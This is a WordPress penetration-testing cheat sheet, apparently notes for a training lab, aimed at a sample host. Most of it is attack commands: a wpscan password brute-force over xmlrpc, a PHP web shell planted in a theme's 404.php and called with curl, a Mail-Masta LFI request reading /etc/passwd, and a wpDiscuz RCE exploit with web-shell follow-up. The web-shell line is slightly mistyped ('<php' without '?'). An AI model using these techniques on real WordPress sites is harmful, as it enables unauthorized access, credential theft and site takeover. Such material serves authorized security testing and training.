
## Wordpress User Roles

| User Role     | Description                                                                                                                 |
| ------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Administrator | Full Privileges - This user role is an interesting target due to his capability of managing plugins                         |
| Editor        | Can publish and manage any user's posts - This user role is an interesting target due to his capability of managing plugins |
| Author        | Can publish and manage their posts                                                                                          |
| Contributor   | Can write and manage their own post, but he cannot publish them                                                             |
| Subscriber    | Can view posts and manage/modify their profile                                                                              |

***

## WordPress Discovery/Footprinting

```sh
http://blog.inlanefreight.local/robots.txt
### check if robots.txt contain any wp-entry 

http://blog.inlanefreight.local/wp-admin
http://blog.inlanefreight.local/wp-content
### check if wp-admin or wp-content exists

http://blog.inlanefreight.local/wp-content/plugins
http://blog.inlanefreight.local/wp-content/themes
### enumerate and look for vulnerable themes and plugins
```

```sh
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local | grep themes
curl -s http://blog.inlanefreight.local | grep plugins
### Check webpage source
```

***

## WpScan

```sh
wpscan --url test.example --api-token TOKENVALUE --output wpscan-ir-host
### Run wpscan using an api token

sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>
### Perform a login brute force attack against the target
```

**Login Form - Usernames Enumeration**: In some versions of wordpress it's possible to enumerate usernames due to WP error messages giving too many information: whenever a username is right, the web application may show a message such as `"the password is not valid"`, giving that the username is valid.

***

## Remote Code Execution (Admin)

### Metasploit

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module can upload and execute shell automatically.

### Manually, by modifying a theme:
 
Click on `Apparance` on the side panel and select Theme Editor. Then click on `Select` after selecting the theme, and we can edit an uncommon page such as `404.php` to add a web shell.

```php
<php system($_GET[0]); ?>
```

Access:
```shell
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

***

## **WordPress Known Vulnerable Plugins**

### Mail-Masta: LFI

```sh
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### [wpDiscuz RCE](https://www.exploit-db.com/exploits/49967):

```sh
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```
   
If it fails, use `cURL` to execute commands using the uploaded web shell: 

```sh
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

---
